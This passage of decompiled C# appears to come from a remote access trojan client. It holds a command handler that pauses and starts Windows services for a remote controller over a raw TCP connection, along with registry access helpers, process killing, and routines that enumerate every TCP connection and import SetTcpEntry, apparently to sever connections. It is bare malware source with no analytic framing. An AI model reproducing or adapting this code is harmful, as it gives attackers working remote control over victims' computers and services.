										if (Operators.CompareString(serviceController3.ServiceName.ToLower(), array[num54].ToLower(), false) == 0)
										{
											try
											{
												serviceController3.Pause();
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													"Paused ",
													serviceController3.DisplayName
												}));
												break;
											}
											catch (Exception ex28)
											{
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													ex28.Message
												}));
												break;
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text47, "#", false) == 0)
							{
								foreach (ServiceController serviceController4 in ServiceController.GetServices())
								{
									int num56 = 3;
									int num57 = array.Length - 1;
									for (int num58 = num56; num58 <= num57; num58++)
									{
										if (Operators.CompareString(serviceController4.ServiceName.ToLower(), array[num58].ToLower(), false) == 0)
										{
											try
											{
												serviceController4.Start();
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													"Started ",
													serviceController4.DisplayName
												}));
												break;
											}
											catch (Exception ex29)
											{
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													ex29.Message
												}));
												break;
											}
										}
									}
								}
							}
						}
					}
				}
				catch (Exception ex30)
				{
					try
					{
						this.Send(string.Concat(new string[]
						{
							"Ex",
							this.Y,
							array[1],
							":",
							array[2],
							"--> ",
							ex30.Message
						}));
					}
					catch (Exception ex31)
					{
					}
				}
			}
		}

		// Token: 0x06000019 RID: 25
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool EnumWindows(A.EnumWindowsProc lpEnumFunc, IntPtr lParam);

		// Token: 0x0600001A RID: 26 RVA: 0x000051E8 File Offset: 0x000033E8
		public RegistryKey GetKey(string key, bool write)
		{
			RegistryKey registryKey = null;
			string text = Strings.Split(key, "\\", -1, CompareMethod.Binary)[0];
			if (Operators.CompareString(text, this.F.Registry.ClassesRoot.Name, false) == 0)
			{
				registryKey = this.F.Registry.ClassesRoot;
			}
			else if (Operators.CompareString(text, this.F.Registry.CurrentUser.Name, false) == 0)
			{
				registryKey = this.F.Registry.CurrentUser;
			}
			else if (Operators.CompareString(text, this.F.Registry.LocalMachine.Name, false) == 0)
			{
				registryKey = this.F.Registry.LocalMachine;
			}
			else if (Operators.CompareString(text, this.F.Registry.Users.Name, false) == 0)
			{
				registryKey = this.F.Registry.Users;
			}
			return registryKey.OpenSubKey(key.Remove(0, checked(registryKey.Name.Length + 1)), write);
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000052EC File Offset: 0x000034EC
		public void Clear()
		{
			this.CN = false;
			this.C = null;
			try
			{
				if (this.Pro != null)
				{
					this.Pro.Kill();
					this.Pro = null;
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00005344 File Offset: 0x00003544
		public void Send(byte[] b)
		{
			try
			{
				TcpClient c = this.C;
				lock (c)
				{
					MemoryStream memoryStream = new MemoryStream();
					string text = Conversions.ToString(b.Length) + "\0";
					byte[] array = this.SB(ref text);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					this.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					memoryStream.Dispose();
				}
			}
			catch (Exception ex)
			{
				this.Clear();
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000053F8 File Offset: 0x000035F8
		public void Send(string S)
		{
			this.Send(this.SB(ref S));
		}

		// Token: 0x0600001E RID: 30
		[DllImport("iphlpapi.dll")]
		private static extern int SetTcpEntry(IntPtr pTcprow);

		// Token: 0x0600001F RID: 31
		[DllImport("iphlpapi.dll", SetLastError = true)]
		private static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, A.TCP_TABLE_CLASS tblClass, int reserved);

		// Token: 0x06000020 RID: 32 RVA: 0x00005408 File Offset: 0x00003608
		public A.MIB_TCPROW_OWNER_PID[] GetAllTcpConnections()
		{
			int num = 2;
			int num2 = 0;
			uint num3 = A.GetExtendedTcpTable(IntPtr.Zero, ref num2, true, num, A.TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0);
			IntPtr intPtr = Marshal.AllocHGlobal(num2);
			A.MIB_TCPROW_OWNER_PID[] array;
			try
			{
				num3 = A.GetExtendedTcpTable(intPtr, ref num2, true, num, A.TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL, 0);
				if ((ulong)num3 != 0UL)
				{
					return null;
				}
				object obj = Marshal.PtrToStructure(intPtr, typeof(A.MIB_TCPTABLE_OWNER_PID));
				A.MIB_TCPTABLE_OWNER_PID mib_TCPTABLE_OWNER_PID2 = new A.MIB_TCPTABLE_OWNER_PID();
                A.MIB_TCPTABLE_OWNER_PID mib_TCPTABLE_OWNER_PID = ((obj != null) ? ((A.MIB_TCPTABLE_OWNER_PID)obj) : mib_TCPTABLE_OWNER_PID2);
				checked
				{
					IntPtr intPtr2 = (IntPtr)((long)intPtr + unchecked((long)Marshal.SizeOf(mib_TCPTABLE_OWNER_PID.dwNumEntries)));
					array = new A.MIB_TCPROW_OWNER_PID[(int)(unchecked((ulong)mib_TCPTABLE_OWNER_PID.dwNumEntries) - 1UL) + 1];
					int num4 = 0;
					int num5 = (int)(unchecked((ulong)mib_TCPTABLE_OWNER_PID.dwNumEntries) - 1UL);
					for (int i = num4; i <= num5; i++)
					{
						object obj2 = Marshal.PtrToStructure(intPtr2, typeof(A.MIB_TCPROW_OWNER_PID));
                        A.MIB_TCPROW_OWNER_PID mib_TCPROW_OWNER_PID2 = new A.MIB_TCPROW_OWNER_PID();
                        A.MIB_TCPROW_OWNER_PID mib_TCPROW_OWNER_PID = ((obj2 != null) ? ((A.MIB_TCPROW_OWNER_PID)obj2) : mib_TCPROW_OWNER_PID2);
                        array[i] = mib_TCPROW_OWNER_PID;
						intPtr2 = (IntPtr)((long)intPtr2 + unchecked((long)Marshal.SizeOf(mib_TCPROW_OWNER_PID)));
					}
				}
			}
			finally
			{
				Marshal.FreeHGlobal(intPtr);
			}
			return array;
		}

		// Token: 0x04000006 RID: 6
		public string H;

		// Token: 0x04000007 RID: 7
		public int P;

		// Token: 0x04000008 RID: 8
		public bool CN;

		// Token: 0x04000009 RID: 9
		public string Y;

		// Token: 0x0400000A RID: 10
		public TcpClient C;

		// Token: 0x0400000B RID: 11
		private Process Pro;

		// Token: 0x0400000C RID: 12
		public Computer F;

		// Token: 0x02000008 RID: 8
		// (Invoke) Token: 0x06000025 RID: 37
		private delegate bool EnumWindowsProc(IntPtr hWnd, ref IntPtr lParam);

		// Token: 0x02000009 RID: 9
		public struct MIB_TCPROW_OWNER_PID
		{
			// Token: 0x0400000D RID: 13
			public uint state;

			// Token: 0x0400000E RID: 14
			public uint LA;

			// Token: 0x0400000F RID: 15
			public byte l1;

			// Token: 0x04000010 RID: 16
			public byte l2;

			// Token: 0x04000011 RID: 17
			public byte l3;

			// Token: 0x04000012 RID: 18
			public byte l4;

			// Token: 0x04000013 RID: 19
			public uint RA;

			// Token: 0x04000014 RID: 20
			public byte R1;

			// Token: 0x04000015 RID: 21
			public byte R2;

			// Token: 0x04000016 RID: 22
			public byte R3;

			// Token: 0x04000017 RID: 23
			public byte R4;

			// Token: 0x04000018 RID: 24
			public int P;
		}

		// Token: 0x0200000A RID: 10
		public struct MIB_TCPTABLE_OWNER_PID
		{
			// Token: 0x04000019 RID: 25
			public uint dwNumEntries;

			// Token: 0x0400001A RID: 26
			private A.MIB_TCPROW_OWNER_PID table;
		}

		// Token: 0x0200000B RID: 11
		public enum TCP_TABLE_CLASS
		{
			// Token: 0x0400001C RID: 28
			TCP_TABLE_BASIC_LISTENER,
			// Token: 0x0400001D RID: 29
			TCP_TABLE_BASIC_CONNECTIONS,
			// Token: 0x0400001E RID: 30
			TCP_TABLE_BASIC_ALL,
			// Token: 0x0400001F RID: 31
			TCP_TABLE_OWNER_PID_LISTENER,
			// Token: 0x04000020 RID: 32
			TCP_TABLE_OWNER_PID_CONNECTIONS,
			// Token: 0x04000021 RID: 33
			TCP_TABLE_OWNER_PID_ALL,
			// Token: 0x04000022 RID: 34
			TCP_TABLE_OWNER_MODULE_LISTENER,
			// Token: 0x04000023 RID: 35
			TCP_TABLE_OWNER_MODULE_CONNECTIONS,
			// Token: 0x04000024 RID: 36
			TCP_TABLE_OWNER_MODULE_ALL
		}
	}
}
